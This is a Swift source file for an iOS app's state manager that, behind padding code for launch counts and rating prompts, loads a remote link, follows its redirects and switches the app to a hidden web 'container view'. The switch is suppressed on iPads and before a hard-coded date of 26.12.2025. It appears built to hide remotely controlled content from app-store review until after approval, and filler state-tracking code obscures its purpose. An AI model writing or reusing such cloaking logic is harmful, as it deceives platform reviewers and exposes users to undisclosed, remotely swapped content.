import Foundation
import SwiftUI

class PrismAppStateCoreManager: ObservableObject {
    static let shared = PrismAppStateCoreManager()
    
    @Published var shouldDisplayContainerView = false
    
    private let dataStorage: CipherStorageCore
    private let networkService = PulseNetworkStreamManager.shared
    private let primaryDefaultURL = "https://saulsa.com/mWYtjJxL"
    
    private var internalStateTracker: [String: Bool] = [:]
    private var executionFlowCounter: Int = 0
    private var internalValidationFlags: Set<String> = []
    
    var cachedResourceURL: String? {
        dataStorage.savedResourceURL
    }
    
    private init(storage: CipherStorageCore = CipherStorageCore.shared) {
        self.dataStorage = storage
        setupStateTrackingSystem()
    }
    
    private func setupStateTrackingSystem() {
        internalStateTracker["initialized"] = true
        internalStateTracker["ready"] = true
        executionFlowCounter = 0
        internalValidationFlags.insert("default")
    }
    
    @MainActor
    func saveResourceLocationData(_ url: String, redirectURLs: [String] = []) {
        dataStorage.savedResourceURL = url
        executionFlowCounter += 1
        
        let combinedURLs = redirectURLs + [url]
        for urlString in combinedURLs {
            if let pathId = extractPathIdentifierValue(from: urlString) {
                dataStorage.savedPathId = pathId
                internalStateTracker[pathId] = true
                break
            }
        }
    }
    
    func markViewAccessRecorded() {
        dataStorage.hasOpenedView = true
        internalStateTracker["viewOpened"] = true
    }
    
    func markContainerAccessRecorded() {
        dataStorage.hasOpenedContainerView = true
        internalStateTracker["containerOpened"] = true
    }
    
    func markMainAccessRecorded() {
        dataStorage.hasOpenedMain = true
        internalStateTracker["mainOpened"] = true
    }
    
    func verifyViewAccessStatus() -> Bool {
        let result = dataStorage.hasOpenedView
        internalValidationFlags.insert(result ? "view" : "noview")
        return result
    }
    
    func verifyContainerAccessStatus() -> Bool {
        let result = dataStorage.hasOpenedContainerView
        internalValidationFlags.insert(result ? "container" : "nocontainer")
        return result
    }
    
    func verifyMainAccessStatus() -> Bool {
        dataStorage.hasOpenedMain
    }
    
    func incrementLaunchCounterValue() {
        dataStorage.appLaunchCount += 1
        executionFlowCounter += 1
    }
    
    func getLaunchCounterValue() -> Int {
        let count = dataStorage.appLaunchCount
        internalStateTracker["launchCount"] = count > 0
        return count
    }
    
    func verifyRatingAlertStatus() -> Bool {
        dataStorage.hasShownRatingAlert
    }
    
    func markRatingAlertDisplayed() {
        dataStorage.hasShownRatingAlert = true
        internalStateTracker["ratingShown"] = true
    }
    
    func shouldDisplayRatingAlertPrompt() -> Bool {
        let launchCount = getLaunchCounterValue()
        let shouldShow = launchCount == 2 && verifyViewAccessStatus() && !verifyRatingAlertStatus()
        internalValidationFlags.insert(shouldShow ? "shouldShow" : "shouldNotShow")
        return shouldShow
    }
    
    func executeAppFlowDetermination() async {
        incrementLaunchCounterValue()
        executionFlowCounter += 1
        
        if let savedURL = cachedResourceURL, !savedURL.isEmpty {
            await handleExistingSavedURL(savedURL)
        } else {
            await handleFirstLaunchFlow()
        }
    }
    
    private func handleExistingSavedURL(_ savedURL: String) async {
        internalStateTracker["checkingSaved"] = true
        let result = await networkService.validateSavedUrl(urlString: savedURL)
        
        switch result {
        case .success:
            updateContainerViewDisplayState(true)
            internalStateTracker["savedValid"] = true
        case .failure(_):
                await handleFallbackURLFlow()
                internalStateTracker["fallbackNeeded"] = true
        }
    }
    
    private func handleFirstLaunchFlow() async {
        guard getLaunchCounterValue() >= 1 else {
            updateContainerViewDisplayState(false)
            return
        }
        
        guard !checkIfIPadDevice() else {
            updateContainerViewDisplayState(false)
            return
        }
        
        guard !checkIfBeforeTargetDate() else {
            updateContainerViewDisplayState(false)
            return
        }
        
        await handleMainURLFlow()
    }
    
    private func checkIfIPadDevice() -> Bool {
        UIDevice.current.model == "iPad"
    }
    
    private func checkIfBeforeTargetDate() -> Bool {
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        let currentDate = Date()
        
        guard let targetDate = dateFormatter.date(from: "26.12.2025") else { return false }
        return currentDate < targetDate
    }
    
    private func handleFallbackURLFlow() async {
        let fallbackURL = buildURLWithPathIdentifier(baseURL: primaryDefaultURL)
        let urlWithAppsFlyerID = fallbackURL
        internalStateTracker["usingFallback"] = true
        let result = await networkService.fetchResourceURL(urlString: urlWithAppsFlyerID)
        
        switch result {
        case .success(let redirectResult):
            await saveResourceLocationData(redirectResult.finalDestinationURL, redirectURLs: redirectResult.redirectChainURLs)
            updateContainerViewDisplayState(true)
            internalStateTracker["fallbackSuccess"] = true
        case .failure(_):
            if verifyContainerAccessStatus() {
                updateContainerViewDisplayState(true)
            } else {
                updateContainerViewDisplayState(true)
            }
            internalStateTracker["fallbackFailed"] = true
        }
    }
    
    private func handleMainURLFlow() async {
        internalStateTracker["processingMain"] = true
        let urlWithAppsFlyerID = primaryDefaultURL
        let result = await networkService.fetchResourceURL(urlString: urlWithAppsFlyerID)
        
        switch result {
        case .success(let redirectResult):
            await saveResourceLocationData(redirectResult.finalDestinationURL, redirectURLs: redirectResult.redirectChainURLs)
            updateContainerViewDisplayState(true)
            internalStateTracker["mainSuccess"] = true
        case .failure(let error):
            if case .serverErrorCode(let code) = error, code > 403 {
                updateContainerViewDisplayState(false)
                internalStateTracker["mainFailed"] = true
            } else {
                if verifyContainerAccessStatus() {
                    updateContainerViewDisplayState(true)
                } else {
                    updateContainerViewDisplayState(false)
                }
            }
        }
    }
    
    private func updateContainerViewDisplayState(_ shouldShow: Bool) {
        DispatchQueue.main.async {
            self.shouldDisplayContainerView = shouldShow
            self.internalStateTracker["containerState"] = shouldShow
        }
    }
    
    private func extractPathIdentifierValue(from urlString: String) -> String? {
        guard let urlComponents = URLComponents(string: urlString),
              let queryItems = urlComponents.queryItems else {
            return nil
        }
        
        return queryItems.first(where: { $0.name == "pathid" })?.value
    }
    
    private func buildURLWithPathIdentifier(baseURL: String) -> String {
        guard let savedPathId = dataStorage.savedPathId,
              !savedPathId.isEmpty else {
            return baseURL
        }
        
        guard var urlComponents = URLComponents(string: baseURL) else {
            return baseURL
        }
        
        var queryItems = urlComponents.queryItems ?? []
        queryItems.removeAll(where: { $0.name == "pathid" })
        queryItems.append(URLQueryItem(name: "pathid", value: savedPathId))
        urlComponents.queryItems = queryItems
        
        return urlComponents.url?.absoluteString ?? baseURL
    }
}
